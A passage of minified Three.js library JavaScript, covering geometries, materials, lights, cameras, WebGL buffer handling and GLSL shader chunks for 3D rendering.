i=0;i<6;i++)n[i].copy(e.planes[i]);return this}setFromProjectionMatrix(e,n=ii,i=!1){const s=this.planes,r=e.elements,a=r[0],o=r[1],l=r[2],c=r[3],p=r[4],d=r[5],h=r[6],f=r[7],v=r[8],y=r[9],m=r[10],u=r[11],g=r[12],_=r[13],b=r[14],T=r[15];if(s[0].setComponents(c-a,f-p,u-v,T-g).normalize(),s[1].setComponents(c+a,f+p,u+v,T+g).normalize(),s[2].setComponents(c+o,f+d,u+y,T+_).normalize(),s[3].setComponents(c-o,f-d,u-y,T-_).normalize(),i)s[4].setComponents(l,h,m,b).normalize(),s[5].setComponents(c-l,f-h,u-m,T-b).normalize();else if(s[4].setComponents(c-l,f-h,u-m,T-b).normalize(),n===ii)s[5].setComponents(c+l,f+h,u+m,T+b).normalize();else if(n===Il)s[5].setComponents(l,h,m,b).normalize();else throw new Error("THREE.Frustum.setFromProjectionMatrix(): Invalid coordinate system: "+n);return this}intersectsObject(e){if(e.boundingSphere!==void 0)e.boundingSphere===null&&e.computeBoundingSphere(),_s.copy(e.boundingSphere).applyMatrix4(e.matrixWorld);else{const n=e.geometry;n.boundingSphere===null&&n.computeBoundingSphere(),_s.copy(n.boundingSphere).applyMatrix4(e.matrixWorld)}return this.intersectsSphere(_s)}intersectsSprite(e){_s.center.set(0,0,0);const n=Hw.distanceTo(e.center);return _s.radius=.7071067811865476+n,_s.applyMatrix4(e.matrixWorld),this.intersectsSphere(_s)}intersectsSphere(e){const n=this.planes,i=e.center,s=-e.radius;for(let r=0;r<6;r++)if(n[r].distanceToPoint(i)<s)return!1;return!0}intersectsBox(e){const n=this.planes;for(let i=0;i<6;i++){const s=n[i];if(Vo.x=s.normal.x>0?e.max.x:e.min.x,Vo.y=s.normal.y>0?e.max.y:e.min.y,Vo.z=s.normal.z>0?e.max.z:e.min.z,s.distanceToPoint(Vo)<0)return!1}return!0}containsPoint(e){const n=this.planes;for(let i=0;i<6;i++)if(n[i].distanceToPoint(e)<0)return!1;return!0}clone(){return new this.constructor().copy(this)}}class Gw extends Yt{constructor(e,n,i,s,r,a,o,l,c){super(e,n,i,s,r,a,o,l,c),this.isCanvasTexture=!0,this.needsUpdate=!0}}class ja extends Yt{constructor(e,n,i=ci,s,r,a,o=Bt,l=Bt,c,p=Li,d=1){if(p!==Li&&p!==Ps)throw new Error("DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat");const h={width:e,height:n,depth:d};super(h,s,r,a,o,l,p,i,c),this.isDepthTexture=!0,this.flipY=!1,this.generateMipmaps=!1,this.compareFunction=null}copy(e){return super.copy(e),this.source=new lh(Object.assign({},e.image)),this.compareFunction=e.compareFunction,this}toJSON(e){const n=super.toJSON(e);return this.compareFunction!==null&&(n.compareFunction=this.compareFunction),n}}class Ww extends ja{constructor(e,n=ci,i=Fs,s,r,a=Bt,o=Bt,l,c=Li){const p={width:e,height:e,depth:1},d=[p,p,p,p,p,p];super(e,e,n,i,s,r,a,o,l,c),this.image=d,this.isCubeDepthTexture=!0,this.isCubeTexture=!0}get images(){return this.image}set images(e){this.image=e}}class $0 extends Yt{constructor(e=null){super(),this.sourceTexture=e,this.isExternalTexture=!0}copy(e){return super.copy(e),this.sourceTexture=e.sourceTexture,this}}class tc extends $n{constructor(e=1,n=1,i=1,s=1){super(),this.type="PlaneGeometry",this.parameters={width:e,height:n,widthSegments:i,heightSegments:s};const r=e/2,a=n/2,o=Math.floor(i),l=Math.floor(s),c=o+1,p=l+1,d=e/o,h=n/l,f=[],v=[],y=[],m=[];for(let u=0;u<p;u++){const g=u*h-a;for(let _=0;_<c;_++){const b=_*d-r;v.push(b,-g,0),y.push(0,0,1),m.push(_/o),m.push(1-u/l)}}for(let u=0;u<l;u++)for(let g=0;g<o;g++){const _=g+c*u,b=g+c*(u+1),T=g+1+c*(u+1),A=g+1+c*u;f.push(_,b,A),f.push(b,T,A)}this.setIndex(f),this.setAttribute("position",new tn(v,3)),this.setAttribute("normal",new tn(y,3)),this.setAttribute("uv",new tn(m,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new tc(e.width,e.height,e.widthSegments,e.heightSegments)}}class ph extends $n{constructor(e=1,n=32,i=16,s=0,r=Math.PI*2,a=0,o=Math.PI){super(),this.type="SphereGeometry",this.parameters={radius:e,widthSegments:n,heightSegments:i,phiStart:s,phiLength:r,thetaStart:a,thetaLength:o},n=Math.max(3,Math.floor(n)),i=Math.max(2,Math.floor(i));const l=Math.min(a+o,Math.PI);let c=0;const p=[],d=new H,h=new H,f=[],v=[],y=[],m=[];for(let u=0;u<=i;u++){const g=[],_=u/i;let b=0;u===0&&a===0?b=.5/n:u===i&&l===Math.PI&&(b=-.5/n);for(let T=0;T<=n;T++){const A=T/n;d.x=-e*Math.cos(s+A*r)*Math.sin(a+_*o),d.y=e*Math.cos(a+_*o),d.z=e*Math.sin(s+A*r)*Math.sin(a+_*o),v.push(d.x,d.y,d.z),h.copy(d).normalize(),y.push(h.x,h.y,h.z),m.push(A+b,1-_),g.push(c++)}p.push(g)}for(let u=0;u<i;u++)for(let g=0;g<n;g++){const _=p[u][g+1],b=p[u][g],T=p[u+1][g],A=p[u+1][g+1];(u!==0||a>0)&&f.push(_,b,A),(u!==i-1||l<Math.PI)&&f.push(b,T,A)}this.setIndex(f),this.setAttribute("position",new tn(v,3)),this.setAttribute("normal",new tn(y,3)),this.setAttribute("uv",new tn(m,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new ph(e.radius,e.widthSegments,e.heightSegments,e.phiStart,e.phiLength,e.thetaStart,e.thetaLength)}}class Ul extends $n{constructor(e=1,n=.4,i=12,s=48,r=Math.PI*2){super(),this.type="TorusGeometry",this.parameters={radius:e,tube:n,radialSegments:i,tubularSegments:s,arc:r},i=Math.floor(i),s=Math.floor(s);const a=[],o=[],l=[],c=[],p=new H,d=new H,h=new H;for(let f=0;f<=i;f++)for(let v=0;v<=s;v++){const y=v/s*r,m=f/i*Math.PI*2;d.x=(e+n*Math.cos(m))*Math.cos(y),d.y=(e+n*Math.cos(m))*Math.sin(y),d.z=n*Math.sin(m),o.push(d.x,d.y,d.z),p.x=e*Math.cos(y),p.y=e*Math.sin(y),h.subVectors(d,p).normalize(),l.push(h.x,h.y,h.z),c.push(v/s),c.push(f/i)}for(let f=1;f<=i;f++)for(let v=1;v<=s;v++){const y=(s+1)*f+v-1,m=(s+1)*(f-1)+v-1,u=(s+1)*(f-1)+v,g=(s+1)*f+v;a.push(y,m,g),a.push(m,u,g)}this.setIndex(a),this.setAttribute("position",new tn(o,3)),this.setAttribute("normal",new tn(l,3)),this.setAttribute("uv",new tn(c,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new Ul(e.radius,e.tube,e.radialSegments,e.tubularSegments,e.arc)}}class jw extends di{constructor(e){super(e),this.isRawShaderMaterial=!0,this.type="RawShaderMaterial"}}class Xw extends no{constructor(e){super(),this.isMeshStandardMaterial=!0,this.type="MeshStandardMaterial",this.defines={STANDARD:""},this.color=new je(16777215),this.roughness=1,this.metalness=0,this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new je(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=F0,this.normalScale=new Ze(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.roughnessMap=null,this.metalnessMap=null,this.alphaMap=null,this.envMap=null,this.envMapRotation=new ui,this.envMapIntensity=1,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.flatShading=!1,this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.defines={STANDARD:""},this.color.copy(e.color),this.roughness=e.roughness,this.metalness=e.metalness,this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.roughnessMap=e.roughnessMap,this.metalnessMap=e.metalnessMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapRotation.copy(e.envMapRotation),this.envMapIntensity=e.envMapIntensity,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.flatShading=e.flatShading,this.fog=e.fog,this}}class qw extends no{constructor(e){super(),this.isMeshDepthMaterial=!0,this.type="MeshDepthMaterial",this.depthPacking=iw,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.setValues(e)}copy(e){return super.copy(e),this.depthPacking=e.depthPacking,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this}}class Yw extends no{constructor(e){super(),this.isMeshDistanceMaterial=!0,this.type="MeshDistanceMaterial",this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.setValues(e)}copy(e){return super.copy(e),this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this}}class hh extends $t{constructor(e,n=1){super(),this.isLight=!0,this.type="Light",this.color=new je(e),this.intensity=n}dispose(){this.dispatchEvent({type:"dispose"})}copy(e,n){return super.copy(e,n),this.color.copy(e.color),this.intensity=e.intensity,this}toJSON(e){const n=super.toJSON(e);return n.object.color=this.color.getHex(),n.object.intensity=this.intensity,n}}const au=new bt,vm=new H,_m=new H;class K0{constructor(e){this.camera=e,this.intensity=1,this.bias=0,this.normalBias=0,this.radius=1,this.blurSamples=8,this.mapSize=new Ze(512,512),this.mapType=yn,this.map=null,this.mapPass=null,this.matrix=new bt,this.autoUpdate=!0,this.needsUpdate=!1,this._frustum=new dh,this._frameExtents=new Ze(1,1),this._viewportCount=1,this._viewports=[new St(0,0,1,1)]}getViewportCount(){return this._viewportCount}getFrustum(){return this._frustum}updateMatrices(e){const n=this.camera,i=this.matrix;vm.setFromMatrixPosition(e.matrixWorld),n.position.copy(vm),_m.setFromMatrixPosition(e.target.matrixWorld),n.lookAt(_m),n.updateMatrixWorld(),au.multiplyMatrices(n.projectionMatrix,n.matrixWorldInverse),this._frustum.setFromProjectionMatrix(au,n.coordinateSystem,n.reversedDepth),n.reversedDepth?i.set(.5,0,0,.5,0,.5,0,.5,0,0,1,0,0,0,0,1):i.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1),i.multiply(au)}getViewport(e){return this._viewports[e]}getFrameExtents(){return this._frameExtents}dispose(){this.map&&this.map.dispose(),this.mapPass&&this.mapPass.dispose()}copy(e){return this.camera=e.camera.clone(),this.intensity=e.intensity,this.bias=e.bias,this.radius=e.radius,this.autoUpdate=e.autoUpdate,this.needsUpdate=e.needsUpdate,this.normalBias=e.normalBias,this.blurSamples=e.blurSamples,this.mapSize.copy(e.mapSize),this}clone(){return new this.constructor().copy(this)}toJSON(){const e={};return this.intensity!==1&&(e.intensity=this.intensity),this.bias!==0&&(e.bias=this.bias),this.normalBias!==0&&(e.normalBias=this.normalBias),this.radius!==1&&(e.radius=this.radius),(this.mapSize.x!==512||this.mapSize.y!==512)&&(e.mapSize=this.mapSize.toArray()),e.camera=this.camera.toJSON(!1).object,delete e.camera.matrix,e}}class $w extends K0{constructor(){super(new xn(90,1,.5,500)),this.isPointLightShadow=!0}}class Kw extends hh{constructor(e,n,i=0,s=2){super(e,n),this.isPointLight=!0,this.type="PointLight",this.distance=i,this.decay=s,this.shadow=new $w}get power(){return this.intensity*4*Math.PI}set power(e){this.intensity=e/(4*Math.PI)}dispose(){super.dispose(),this.shadow.dispose()}copy(e,n){return super.copy(e,n),this.distance=e.distance,this.decay=e.decay,this.shadow=e.shadow.clone(),this}toJSON(e){const n=super.toJSON(e);return n.object.distance=this.distance,n.object.decay=this.decay,n.object.shadow=this.shadow.toJSON(),n}}class fh extends X0{constructor(e=-1,n=1,i=1,s=-1,r=.1,a=2e3){super(),this.isOrthographicCamera=!0,this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=e,this.right=n,this.top=i,this.bottom=s,this.near=r,this.far=a,this.updateProjectionMatrix()}copy(e,n){return super.copy(e,n),this.left=e.left,this.right=e.right,this.top=e.top,this.bottom=e.bottom,this.near=e.near,this.far=e.far,this.zoom=e.zoom,this.view=e.view===null?null:Object.assign({},e.view),this}setViewOffset(e,n,i,s,r,a){this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=n,this.view.offsetX=i,this.view.offsetY=s,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=(this.right-this.left)/(2*this.zoom),n=(this.top-this.bottom)/(2*this.zoom),i=(this.right+this.left)/2,s=(this.top+this.bottom)/2;let r=i-e,a=i+e,o=s+n,l=s-n;if(this.view!==null&&this.view.enabled){const c=(this.right-this.left)/this.view.fullWidth/this.zoom,p=(this.top-this.bottom)/this.view.fullHeight/this.zoom;r+=c*this.view.offsetX,a=r+c*this.view.width,o-=p*this.view.offsetY,l=o-p*this.view.height}this.projectionMatrix.makeOrthographic(r,a,o,l,this.near,this.far,this.coordinateSystem,this.reversedDepth),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const n=super.toJSON(e);return n.object.zoom=this.zoom,n.object.left=this.left,n.object.right=this.right,n.object.top=this.top,n.object.bottom=this.bottom,n.object.near=this.near,n.object.far=this.far,this.view!==null&&(n.object.view=Object.assign({},this.view)),n}}class Zw extends K0{constructor(){super(new fh(-5,5,5,-5,.5,500)),this.isDirectionalLightShadow=!0}}class Jw extends hh{constructor(e,n){super(e,n),this.isDirectionalLight=!0,this.type="DirectionalLight",this.position.copy($t.DEFAULT_UP),this.updateMatrix(),this.target=new $t,this.shadow=new Zw}dispose(){super.dispose(),this.shadow.dispose()}copy(e){return super.copy(e),this.target=e.target.clone(),this.shadow=e.shadow.clone(),this}toJSON(e){const n=super.toJSON(e);return n.object.shadow=this.shadow.toJSON(),n.object.target=this.target.uuid,n}}class Qw extends hh{constructor(e,n){super(e,n),this.isAmbientLight=!0,this.type="AmbientLight"}}class eE extends xn{constructor(e=[]){super(),this.isArrayCamera=!0,this.isMultiViewCamera=!1,this.cameras=e}}class tE{constructor(e=!0){this.autoStart=e,this.startTime=0,this.oldTime=0,this.elapsedTime=0,this.running=!1}start(){this.startTime=performance.now(),this.oldTime=this.startTime,this.elapsedTime=0,this.running=!0}stop(){this.getElapsedTime(),this.running=!1,this.autoStart=!1}getElapsedTime(){return this.getDelta(),this.elapsedTime}getDelta(){let e=0;if(this.autoStart&&!this.running)return this.start(),0;if(this.running){const n=performance.now();e=(n-this.oldTime)/1e3,this.oldTime=n,this.elapsedTime+=e}return e}}function xm(t,e,n,i){const s=nE(i);switch(n){case D0:return t*e;case O0:return t*e/s.components*s.byteLength;case ih:return t*e/s.components*s.byteLength;case Ir:return t*e*2/s.components*s.byteLength;case sh:return t*e*2/s.components*s.byteLength;case U0:return t*e*3/s.components*s.byteLength;case jn:return t*e*4/s.components*s.byteLength;case rh:return t*e*4/s.components*s.byteLength;case il:case sl:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*8;case rl:case al:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*16;case bd:case Ed:return Math.max(t,16)*Math.max(e,8)/4;case Sd:case wd:return Math.max(t,8)*Math.max(e,8)/2;case Md:case Td:case Cd:case Rd:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*8;case Ad:case Pd:case kd:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*16;case Ld:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*16;case Nd:return Math.floor((t+4)/5)*Math.floor((e+3)/4)*16;case Id:return Math.floor((t+4)/5)*Math.floor((e+4)/5)*16;case Dd:return Math.floor((t+5)/6)*Math.floor((e+4)/5)*16;case Ud:return Math.floor((t+5)/6)*Math.floor((e+5)/6)*16;case Od:return Math.floor((t+7)/8)*Math.floor((e+4)/5)*16;case Fd:return Math.floor((t+7)/8)*Math.floor((e+5)/6)*16;case Bd:return Math.floor((t+7)/8)*Math.floor((e+7)/8)*16;case zd:return Math.floor((t+9)/10)*Math.floor((e+4)/5)*16;case Vd:return Math.floor((t+9)/10)*Math.floor((e+5)/6)*16;case Hd:return Math.floor((t+9)/10)*Math.floor((e+7)/8)*16;case Gd:return Math.floor((t+9)/10)*Math.floor((e+9)/10)*16;case Wd:return Math.floor((t+11)/12)*Math.floor((e+9)/10)*16;case jd:return Math.floor((t+11)/12)*Math.floor((e+11)/12)*16;case Xd:case qd:case Yd:return Math.ceil(t/4)*Math.ceil(e/4)*16;case $d:case Kd:return Math.ceil(t/4)*Math.ceil(e/4)*8;case Zd:case Jd:return Math.ceil(t/4)*Math.ceil(e/4)*16}throw new Error(`Unable to determine texture byte length for ${n} format.`)}function nE(t){switch(t){case yn:case k0:return{byteLength:1,components:1};case Ha:case L0:case ki:return{byteLength:2,components:1};case th:case nh:return{byteLength:2,components:4};case ci:case eh:case ni:return{byteLength:4,components:1};case N0:case I0:return{byteLength:4,components:3}}throw new Error(`Unknown texture type ${t}.`)}typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register",{detail:{revision:Qp}}));typeof window<"u"&&(window.__THREE__?Ie("WARNING: Multiple instances of Three.js being imported."):window.__THREE__=Qp);/**
 * @license
 * Copyright 2010-2025 Three.js Authors
 * SPDX-License-Identifier: MIT
 */function Z0(){let t=null,e=!1,n=null,i=null;function s(r,a){n(r,a),i=t.requestAnimationFrame(s)}return{start:function(){e!==!0&&n!==null&&(i=t.requestAnimationFrame(s),e=!0)},stop:function(){t.cancelAnimationFrame(i),e=!1},setAnimationLoop:function(r){n=r},setContext:function(r){t=r}}}function iE(t){const e=new WeakMap;function n(o,l){const c=o.array,p=o.usage,d=c.byteLength,h=t.createBuffer();t.bindBuffer(l,h),t.bufferData(l,c,p),o.onUploadCallback();let f;if(c instanceof Float32Array)f=t.FLOAT;else if(typeof Float16Array<"u"&&c instanceof Float16Array)f=t.HALF_FLOAT;else if(c instanceof Uint16Array)o.isFloat16BufferAttribute?f=t.HALF_FLOAT:f=t.UNSIGNED_SHORT;else if(c instanceof Int16Array)f=t.SHORT;else if(c instanceof Uint32Array)f=t.UNSIGNED_INT;else if(c instanceof Int32Array)f=t.INT;else if(c instanceof Int8Array)f=t.BYTE;else if(c instanceof Uint8Array)f=t.UNSIGNED_BYTE;else if(c instanceof Uint8ClampedArray)f=t.UNSIGNED_BYTE;else throw new Error("THREE.WebGLAttributes: Unsupported buffer data format: "+c);return{buffer:h,type:f,bytesPerElement:c.BYTES_PER_ELEMENT,version:o.version,size:d}}function i(o,l,c){const p=l.array,d=l.updateRanges;if(t.bindBuffer(c,o),d.length===0)t.bufferSubData(c,0,p);else{d.sort((f,v)=>f.start-v.start);let h=0;for(let f=1;f<d.length;f++){const v=d[h],y=d[f];y.start<=v.start+v.count+1?v.count=Math.max(v.count,y.start+y.count-v.start):(++h,d[h]=y)}d.length=h+1;for(let f=0,v=d.length;f<v;f++){const y=d[f];t.bufferSubData(c,y.start*p.BYTES_PER_ELEMENT,p,y.start,y.count)}l.clearUpdateRanges()}l.onUploadCallback()}function s(o){return o.isInterleavedBufferAttribute&&(o=o.data),e.get(o)}function r(o){o.isInterleavedBufferAttribute&&(o=o.data);const l=e.get(o);l&&(t.deleteBuffer(l.buffer),e.delete(o))}function a(o,l){if(o.isInterleavedBufferAttribute&&(o=o.data),o.isGLBufferAttribute){const p=e.get(o);(!p||p.version<o.version)&&e.set(o,{buffer:o.buffer,type:o.type,bytesPerElement:o.elementSize,version:o.version});return}const c=e.get(o);if(c===void 0)e.set(o,n(o,l));else if(c.version<o.version){if(c.size!==o.array.byteLength)throw new Error("THREE.WebGLAttributes: The size of the buffer attribute's array buffer does not match the original size. Resizing buffer attributes is not supported.");i(c.buffer,o,l),c.version=o.version}}return{get:s,remove:r,update:a}}var sE=`#ifdef USE_ALPHAHASH
	if ( diffuseColor.a < getAlphaHashThreshold( vPosition ) ) discard;
#endif`,rE=`#ifdef USE_ALPHAHASH
	const float ALPHA_HASH_SCALE = 0.05;
	float hash2D( vec2 value ) {
		return fract( 1.0e4 * sin( 17.0 * value.x + 0.1 * value.y ) * ( 0.1 + abs( sin( 13.0 * value.y + value.x ) ) ) );
	}
	float hash3D( vec3 value ) {
		return hash2D( vec2( hash2D( value.xy ), value.z ) );
	}
	float getAlphaHashThreshold( vec3 position ) {
		float maxDeriv = max(
			length( dFdx( position.xyz ) ),
			length( dFdy( position.xyz ) )
		);
		float pixScale = 1.0 / ( ALPHA_HASH_SCALE * maxDeriv );
		vec2 pixScales = vec2(
			exp2( floor( log2( pixScale ) ) ),
			exp2( ceil( log2( pixScale ) ) )
		);
		vec2 alpha = vec2(
			hash3D( floor( pixScales.x * position.xyz ) ),
			hash3D( floor( pixScales.y * position.xyz ) )
		);
		float lerpFactor = fract( log2( pixScale ) );
		float x = ( 1.0 - lerpFactor ) * alpha.x + lerpFactor * alpha.y;
		float a = min( lerpFactor, 1.0 - lerpFactor );
		vec3 cases = vec3(
			x * x / ( 2.0 * a * ( 1.0 - a ) ),
			( x - 0.5 * a ) / ( 1.0 - a ),
			1.0 - ( ( 1.0 - x ) * ( 1.0 - x ) / ( 2.0 * a * ( 1.0 - a ) ) )
		);
		float threshold = ( x < ( 1.0 - a ) )
			? ( ( x < a ) ? cases.x : cases.y )
			: cases.z;
		return clamp( threshold , 1.0e-6, 1.0 );
	}
#endif`,aE=`#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, vAlphaMapUv ).g;
#endif`,oE=`#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,lE=`#ifdef USE_ALPHATEST
	#ifdef ALPHA_TO_COVERAGE
	diffuseColor.a = smoothstep( alphaTest, alphaTest + fwidth( diffuseColor.a ), diffuseColor.a );
	if ( diffuseColor.a == 0.0 ) discard;
	#else
	if ( diffuseColor.a < alphaTest ) discard;
	#endif
#endif`,cE=`#ifdef USE_ALPHATEST
	uniform float alphaTest;
#endif`,uE=`#ifdef USE_AOMAP
	float ambientOcclusion = ( texture2D( aoMap, vAoMapUv ).r - 1.0 ) * aoMapIntensity + 1.0;
	reflectedLight.indirectDiffuse *= ambientOcclusion;
	#if defined( USE_CLEARCOAT ) 
		clearcoatSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_SHEEN ) 
		sheenSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD )
		float dotNV = saturate( dot( geometryNormal, geometryViewDir ) );
		reflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.roughness );
	#endif
#endif`,dE=`#ifdef USE_AOMAP
	uniform sampler2D aoMap;
	uniform float aoMapIntensity;
#endif`,pE=`#ifdef USE_BATCHING
	#if ! defined( GL_ANGLE_multi_draw )
	#define gl_DrawID _gl_DrawID
	uniform int _gl_DrawID;
	#endif
	uniform highp sampler2D batchingTexture;
	uniform highp usampler2D batchingIdTexture;
	mat4 getBatchingMatrix( const in float i ) {
		int size = textureSize( batchingTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( batchingTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( batchingTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( batchingTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( batchingTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
	float getIndirectIndex( const in int i ) {
		int size = textureSize( batchingIdTexture, 0 ).x;
		int x = i % size;
		int y = i / size;
		return float( texelFetch( batchingIdTexture, ivec2( x, y ), 0 ).r );
	}
#endif
#ifdef USE_BATCHING_COLOR
	uniform sampler2D batchingColorTexture;
	vec3 getBatchingColor( const in float i ) {
		int size = textureSize( batchingColorTexture, 0 ).x;
		int j = int( i );
		int x = j % size;
		int y = j / size;
		return texelFetch( batchingColorTexture, ivec2( x, y ), 0 ).rgb;
	}
#endif`,hE=`#ifdef USE_BATCHING
	mat4 batchingMatrix = getBatchingMatrix( getIndirectIndex( gl_DrawID ) );
#endif`,fE=`vec3 transformed = vec3( position );
#ifdef USE_ALPHAHASH
	vPosition = vec3( position );
#endif`,mE=`vec3 objectNormal = vec3( normal );
#ifdef USE_TANGENT
	vec3 objectTangent = vec3( tangent.xyz );
#endif`,gE=`float G_BlinnPhong_Implicit( ) {
	return 0.25;
}
float D_BlinnPhong( const in float shininess, const in float dotNH ) {
	return RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );
}
vec3 BRDF_BlinnPhong( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float shininess ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( specularColor, 1.0, dotVH );
	float G = G_BlinnPhong_Implicit( );
	float D = D_BlinnPhong( shininess, dotNH );
	return F * ( G * D );
} // validated`,vE=`#ifdef USE_IRIDESCENCE
	const mat3 XYZ_TO_REC709 = mat3(
		 3.2404542, -0.9692660,  0.0556434,
		-1.5371385,  1.8760108, -0.2040259,
		-0.4985314,  0.0415560,  1.0572252
	);
	vec3 Fresnel0ToIor( vec3 fresnel0 ) {
		vec3 sqrtF0 = sqrt( fresnel0 );
		return ( vec3( 1.0 ) + sqrtF0 ) / ( vec3( 1.0 ) - sqrtF0 );
	}
	vec3 IorToFresnel0( vec3 transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - vec3( incidentIor ) ) / ( transmittedIor + vec3( incidentIor ) ) );
	}
	float IorToFresnel0( float transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - incidentIor ) / ( transmittedIor + incidentIor ));
	}
	vec3 evalSensitivity( float OPD, vec3 shift ) {
		float phase = 2.0 * PI * OPD * 1.0e-9;
		vec3 val = vec3( 5.4856e-13, 4.4201e-13, 5.2481e-13 );
		vec3 pos = vec3( 1.6810e+06, 1.7953e+06, 2.2084e+06 );
		vec3 var = vec3( 4.3278e+09, 9.3046e+09, 6.6121e+09 );
		vec3 xyz = val * sqrt( 2.0 * PI * var ) * cos( pos * phase + shift ) * exp( - pow2( phase ) * var );
		xyz.x += 9.7470e-14 * sqrt( 2.0 * PI * 4.5282e+09 ) * cos( 2.2399e+06 * phase + shift[ 0 ] ) * exp( - 4.5282e+09 * pow2( phase ) );
		xyz /= 1.0685e-7;
		vec3 rgb = XYZ_TO_REC709 * xyz;
		return rgb;
	}
	vec3 evalIridescence( float outsideIOR, float eta2, float cosTheta1, float thinFilmThickness, vec3 baseF0 ) {
		vec3 I;
		float iridescenceIOR = mix( outsideIOR, eta2, smoothstep( 0.0, 0.03, thinFilmThickness ) );
		float sinTheta2Sq = pow2( outsideIOR / iridescenceIOR ) * ( 1.0 - pow2( cosTheta1 ) );
		float cosTheta2Sq = 1.0 - sinTheta2Sq;
		if ( cosTheta2Sq < 0.0 ) {
			return vec3( 1.0 );
		}
		float cosTheta2 = sqrt( cosTheta2Sq );
		float R0 = IorToFresnel0( iridescenceIOR, outsideIOR );
		float R12 = F_Schlick( R0, 1.0, cosTheta1 );
		float T121 = 1.0 - R12;
		float phi12 = 0.0;
		if ( iridescenceIOR < outsideIOR ) phi12 = PI;
		float phi21 = PI - phi12;
		vec3 baseIOR = Fresnel0ToIor( clamp( baseF0, 0.0, 0.9999 ) );		vec3 R1 = IorToFresnel0( baseIOR, iridescenceIOR );
		vec3 R23 = F_Schlick( R1, 1.0, cosTheta2 );
		vec3 phi23 = vec3( 0.0 );
		if ( baseIOR[ 0 ] < iridescenceIOR ) phi23[ 0 ] = PI;
		if ( baseIOR[ 1 ] < iridescenceIOR ) phi23[ 1 ] = PI;
		if ( baseIOR[ 2 ] < iridescenceIOR ) phi23[ 2 ] = PI;
		float OPD = 2.0 * iridescenceIOR * thinFilmThickness * cosTheta2;
		vec3 phi = vec3( phi21 ) + phi23;
		vec3 R123 = clamp( R12 * R23, 1e-5, 0.9999 );
		vec3 r123 = sqrt( R123 );
		vec3 Rs = pow2( T121 ) * R23 / ( vec3( 1.0 ) - R123 );
		vec3 C0 = R12 + Rs;
		I = C0;
		vec3 Cm = Rs - T121;
		for ( int m = 1; m <= 2; ++ m ) {
			Cm *= r123;
			vec3 Sm = 2.0 * evalSensitivity( float( m ) * OPD, float( m ) * phi );
			I += Cm * Sm;
		}
		return max( I, vec3( 0.0 ) );
	}
#endif`,_E=`#ifdef USE_BUMPMAP
	uniform sampler2D bumpMap;
	uniform float bumpScale;
	vec2 dHdxy_fwd() {
